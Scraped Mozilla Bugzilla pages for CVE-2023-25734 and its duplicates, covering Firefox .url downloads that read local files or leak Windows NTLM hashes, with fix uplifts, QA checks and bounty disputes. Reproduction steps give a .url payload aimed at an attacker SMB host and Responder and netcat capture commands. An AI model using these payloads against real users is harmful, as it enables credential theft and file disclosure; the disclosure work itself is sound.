|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1809923#c34)• 2 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/a2b65e3459a8>

[status-firefox110](/buglist.cgi?f1=cf_status_firefox110&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=fixed)

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1809923#c35)• 2 years ago |
|  | |

Hi team can i get to know how the bounty process will be?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1809923#c36)• 2 years ago |
|  | |

Congratulations, we have awarded a bug bounty for this issue. The award is split with [bug 1810143](/show_bug.cgi?id=1810143 "RESOLVED DUPLICATE - Possible Download of .url Files for Data Exfiltration") which is a duplicate submission filed within the "collision window" defined in our bug bounty policy.

Flags: sec-bounty? → sec-bounty+

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a1672039_406194)• 2 years ago |

Blocks: [CVE-2023-25740](/show_bug.cgi?id=1812354 "RESOLVED FIXED - .SCF file can also send NTLM hashes")See Also: [CVE-2023-25740](/show_bug.cgi?id=1812354 "RESOLVED FIXED - .SCF file can also send NTLM hashes") →

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1809923#c37)• 2 years ago |
|  | |

Daniel Veditz@ I have provided your team the issue details from start with detailed POC details each time. along with more impact details by more analysis from my side.

i didn't find it as fair to split the bounty. since i spend major of my time in this issue for multiple analysis.

Kindly Re-Asses and increase my bounty part. Waiting for your update

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1809923#c38)• 2 years ago |
|  | |

Also from my analysis i have found that this will leak the user ntlm hash with just by visiting a website (0-click)

Considering this all. The impact is more and the bounty will be higher than the one awarded to me.

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1809923#c39)• 2 years ago |
|  | |

Comment on [attachment 9314286](/attachment.cgi?id=9314286 "Bug 1809923, r=gijs") [[details]](/attachment.cgi?id=9314286&action=edit "Bug 1809923, r=gijs")

[Bug 1809923](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read"), r=gijs

Approved for ESR 102.8.0, thanks.

[Attachment #9314286](/attachment.cgi?id=9314286&action=edit "Bug 1809923, r=gijs") -
Flags: approval-mozilla-esr102? → approval-mozilla-esr102+

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1809923#c40)• 2 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr102/rev/3c7d9f78fb64>

[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=fixed)

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1809923#c41)• 2 years ago |
| offtopic | |

| Comment hidden (offtopic) |  |
| --- | --- |

(In reply to Ameen from [comment #37](/show_bug.cgi?id=1809923#c37 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read"))

> Daniel Veditz@ I have provided your team the issue details from start with detailed POC details each time. along with more impact details by more analysis from my side.
>
> i didn't find it as fair to split the bounty. since i spend major of my time in this issue for multiple analysis.
>
> Kindly Re-Asses and increase my bounty part. Waiting for your update

Team kindly provide update on this. im waiting for reply.

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1809923#c42)• 2 years ago |
| offtopic | |

| Comment hidden (offtopic) |  |
| --- | --- |

We do not discuss bounty decisions in Bugzilla, I have forwarded your email to security@mozilla which is the correct forum for those discussions, and we will reply over email.

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1809923#c43)• 2 years ago |
| offtopic | |

| Comment hidden (offtopic) |  |
| --- | --- |

Thanks we will discuss over mail on this.

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a1818058_406194)• 2 years ago |

See Also: → [1784451](/show_bug.cgi?id=1784451 "RESOLVED DUPLICATE - URL files on windows should be flagged as potentially malicious")

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a2225212_553429)• 2 years ago |

Flags: qe-verify+

|  | [Daniel Bodea [:danibodea]](/user_profile?user_id=616104) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1809923#c44)• 2 years ago |
|  | |

I have used the following steps to reproduce:

1. load the test case <https://bugzilla.mozilla.org/attachment.cgi?id=9312000>
2. (necessary to log into Bugzilla)
3. when the test loads check the downloads panel

* Affected build result 1: A file named "example.url" is downloaded automatically
* Fixed build result 1: A file named "example.url.download" is downloaded automatically

4. Browse and load the same file into the test page.

* Affected build result 2: "system.ini" is displayed at the right of the "Browse" button.

  ; for 16-bit app support

  [386Enh]

  woafont=dosapp.fon

  EGA80WOA.FON=EGA80WOA.FON

  EGA40WOA.FON=EGA40WOA.FON

  CGA80WOA.FON=CGA80WOA.FON

  CGA40WOA.FON=CGA40WOA.FON

  [drivers]

  wave=mmdrv.dll

  timer=timer.drv

  [mci]
* Fixed build result 2: "example.url.download" is displayed at the right of the "Browse" button.

  [{000214A0-0000-0000-C000-000000000046}]

  Prop3=19,2

  [InternetShortcut]

  IDList=

  URL=file://C:/Windows/system.ini

  HotKey=0

With these steps, I've reproduced the issue in Release v109.0.1 and Verified the fix in Nightly v111.0a1 from 2022.02.07 and Beta v110.0 (RC).

There is no build to test ESR v102.8.0esr just yet, not even in treeherder.

Important to note that this issue does not seem to be reproducing in non-Windows systems as it is a windows-only vulnerability/hack.

Neal, can you confirm that the right steps were used to verify this fix? Also that this is a Windows-only vulnerability/fix? Thanks!

[status-firefox110](/buglist.cgi?f1=cf_status_firefox110&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=verified)
[status-firefox111](/buglist.cgi?f1=cf_status_firefox111&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=verified)Flags: needinfo?(enndeakin)OS: Unspecified → Windows

|  | [Daniel Bodea [:danibodea]](/user_profile?user_id=616104) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1809923#c45)• 2 years ago |
|  | |

I have also verified the fix of ESR v102.8.0esr on Windows 10. Still waiting on confirmation that the correct steps to reproduce were used.

Status: RESOLVED → VERIFIED
[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=verified)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a2260237_1689)• 2 years ago |

Duplicate of this bug: [1784451](/show_bug.cgi?id=1784451 "RESOLVED DUPLICATE - URL files on windows should be flagged as potentially malicious")

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a2314631_159069)• 2 years ago |

See Also: → [CVE-2023-29541](/show_bug.cgi?id=1810191 "VERIFIED FIXED - .desktop file extension on Linux should be rewritten to .desktop.download to avoid users running local executables _if_ desktop files are executed by the user's file manager.")

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=1809923#c47)• 2 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9317090) (obsolete)
— [Details](attachment.cgi?id=9317090&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=1809923#c48)• 2 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9317100)
— [Details](attachment.cgi?id=9317100&action=edit)

[Attachment #9317090](/attachment.cgi?id=9317090&action=edit "advisory.txt") -
Attachment is obsolete: true

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a2511390_578488)• 2 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][adv-main110+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a2513170_578488)• 2 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][adv-main110+] → [reporter-external] [client-bounty-form] [verif?][adv-main110+][adv-esr102.8+]

|  | [Ameen](/user_profile?user_id=719704)  Reporter |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=1809923#c49)• 2 years ago |
|  | |

Hi Team, Can i get the CVE ID Details Registered for this issue.

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a2739842_428608)• 2 years ago |

Alias: CVE-2023-25734

|  | [Rob Wu [:robwu]](/user_profile?user_id=447061) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a2743225_447061)• 2 years ago |

Flags: needinfo?(enndeakin)

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a3343494_553429)• 2 years ago |

Flags: qe-verify+

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a4299572_159069)• 2 years ago |

See Also: → [1819760](/show_bug.cgi?id=1819760 "VERIFIED FIXED - Dragging and dropping the identity box to the desktop to create a .url shortcut is broken (creates .url.download instead of .url)")

|  | [Neil Deakin](/user_profile?user_id=6102)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a6152754_6102)• 2 years ago |

Blocks: [1824468](/show_bug.cgi?id=1824468 "RESOLVED FIXED - Add tests from bug 1815062 and 1809923")

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a10968058_600971)• 2 years ago |

[Attachment #9312610](/attachment.cgi?id=9312610&action=edit "Bug 1809923, also block url extension when saving files, and use a case insensitive comparison, r=gijs") -
Attachment is obsolete: true

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a24061697_1689)• 1 year ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1809923#a43553680_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1809923&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Ameen](/user_profile?user_id=719704)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from bugzilla.mozilla.org_2d8ddfe8_20250115_085143.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1812338)
* [XML](/show_bug.cgi?ctype=xml&id=1812338)

Closed
[Bug 1812338](/show_bug.cgi?id=1812338)

Opened 2 years ago
Closed 2 years ago

# .URL file can also send NTLM hashes

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

.URL file can also send NTLM hashes

## Categories

### (Firefox :: Security, defect)

[Product:](/describecomponents.cgi?product=Firefox)

Firefox
▾

Firefox
For bugs in Firefox Desktop, the Mozilla Foundation's web browser. For Firefox user interface issues in menus, bookmarks, location bar, and preferences. Many Firefox bugs will either be filed here or in the [Core](https://bugzilla.mozilla.org/describecomponents.cgi?product=Core) product. Bugs for developer tools (F12) should be filed in the [DevTools](https://bugzilla.mozilla.org/describecomponents.cgi?product=DevTools) product. ([more info](https://wiki.mozilla.org/Modules/All#Firefox))
[See Open Bugs in This Product](/buglist.cgi?product=Firefox&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox&component=Security#Security)

Security
▾

Firefox :: Security
For app-level security bugs.

If the problem relates to underlying components (PSM, NSS, Core, Toolkit) then please file it in the appropriate product instead of here.

[See Open Bugs in This Component](/buglist.cgi?product=Firefox&component=Security&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox&component=Security&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox&component=Security)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
DUPLICATE
of [bug 1809923](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read")

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

DUPLICATE

of

Mark as Duplicate

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Priority | --- |
| --- | --- |
| Performance Impact | --- |
| Webcompat Score | --- |
| a11y-review | --- |
| Accessibility Severity | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: haxatron1, Unassigned)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

*Unassigned*

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/ece264081141db92a1ad0d985a5d3489?d=mm&size=40)  [haxatron1](/user_profile?user_id=704427)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/fe2c2192f4fabf01f2d2e700631bb8fe?d=mm&size=40)  [manuel](/user_profile?user_id=688976)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

1 person

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: reporter-external, Whiteboard: [reporter-external] [client-bounty-form] [verif?])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a535590_1689 "2 years ago") | - |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | blocking-fx-sync1.7 | ? |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (1 file)

| [Untitled\_ Jan 25, 2023 10\_57 PM.webm](/attachment.cgi?id=9314015)  [2 years ago](#c0)  [haxatron1](/user_profile?user_id=704427)   4.76 MB, video/webm |  | [Details](/attachment.cgi?id=9314015&action=edit) |
| --- | --- | --- |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [haxatron1](/user_profile?user_id=704427)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1812338#c0)• 2 years ago |
|  | |

Attached video
[Untitled\_ Jan 25, 2023 10\_57 PM.webm](attachment.cgi?id=9314015)
— [Details](attachment.cgi?id=9314015&action=edit)

On Windows, .URL file can also send NTLM hashes via the IconFile parameter. Thus it is possible to reproduce <https://bugzilla.mozilla.org/show_bug.cgi?id=1773894> using .URL file

Flags: sec-bounty?

|  | [haxatron1](/user_profile?user_id=704427)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1812338#c1)• 2 years ago |
|  | |

## STR

1. Host example.url on a server

---

## [{000214A0-0000-0000-C000-000000000046}] Prop3=19,2 [InternetShortcut] IDList= URL=\192.168.1.109\test\test.ico IconFile=\192.168.1.109\test\test.ico HotKey=0

2. Replace all instances of 192.168.1.109 with your responder IP address.
3. Start responder using responder -I eth0 -wvd
4. Create a link that download example.url, see that example.url is downloaded by Firefox without any warning, click Show in Folder and the hash is leaked.

|  | [haxatron1](/user_profile?user_id=704427)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1812338#c2)• 2 years ago |
|  | |

Alternatively, if you don't want to download responder, you may also verify that .url files are sending the hash.

Instead of Step 2, you can start a netcat server using

nc -nvlp 445

And when you download example.url and click Show in Folder a connection to your netcat server is made. On Windows, SMB connection will result in auto-forwarding NTLM hash.

|  | [haxatron1](/user_profile?user_id=704427)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1812338#c3)• 2 years ago |
|  | |

A video is also attached for reference

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1812338#a498_159069)• 2 years ago |

Status: UNCONFIRMED → RESOLVEDClosed: 2 years agoDuplicate of bug: [CVE-2023-25734](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read")Resolution: --- → DUPLICATE

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1812338#a535590_1689)• 2 years ago |

Flags: sec-bounty? → sec-bounty-

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1812338#a24030043_1689)• 1 year ago |

Group: firefox-core-security

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1812338#a42433448_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1812338&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [haxatron1](/user_profile?user_id=704427)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from bugzilla.mozilla.org_fa15c013_20250115_085140.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1810143)
* [XML](/show_bug.cgi?ctype=xml&id=1810143)

Closed
[Bug 1810143](/show_bug.cgi?id=1810143)

Opened 2 years ago
Closed 2 years ago

# Possible Download of .url Files for Data Exfiltration

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Possible Download of .url Files for Data Exfiltration

## Categories

### (Firefox :: Security, defect)

[Product:](/describecomponents.cgi?product=Firefox)

Firefox
▾

Firefox
For bugs in Firefox Desktop, the Mozilla Foundation's web browser. For Firefox user interface issues in menus, bookmarks, location bar, and preferences. Many Firefox bugs will either be filed here or in the [Core](https://bugzilla.mozilla.org/describecomponents.cgi?product=Core) product. Bugs for developer tools (F12) should be filed in the [DevTools](https://bugzilla.mozilla.org/describecomponents.cgi?product=DevTools) product. ([more info](https://wiki.mozilla.org/Modules/All#Firefox))
[See Open Bugs in This Product](/buglist.cgi?product=Firefox&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox&component=Security#Security)

Security
▾

Firefox :: Security
For app-level security bugs.

If the problem relates to underlying components (PSM, NSS, Core, Toolkit) then please file it in the appropriate product instead of here.

[See Open Bugs in This Component](/buglist.cgi?product=Firefox&component=Security&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox&component=Security&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox&component=Security)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
DUPLICATE
of [bug 1809923](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read")

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

DUPLICATE

of

Mark as Duplicate

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Performance Impact | --- |
| --- | --- |
| Webcompat Priority | --- |
| a11y-review | --- |
| Accessibility Severity | --- |
| Webcompat Score | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: fazim.pentester, Unassigned)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

*Unassigned*

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/4894f6e6dda807a548d66213399b6dff?d=mm&size=40)  [fazim.pentester](/user_profile?user_id=720428)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/fe2c2192f4fabf01f2d2e700631bb8fe?d=mm&size=40)  [manuel](/user_profile?user_id=688976)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

1 person

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=1307930 "https://bugs.chromium.org/p/chromium/issues/detail?id=1307930")

## Details

### (Keywords: reporter-external, Whiteboard: [reporter-external] [client-bounty-form] [verif?])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#c2 "2 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | blocking-fx-sync1.7 | ? |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (1 file)

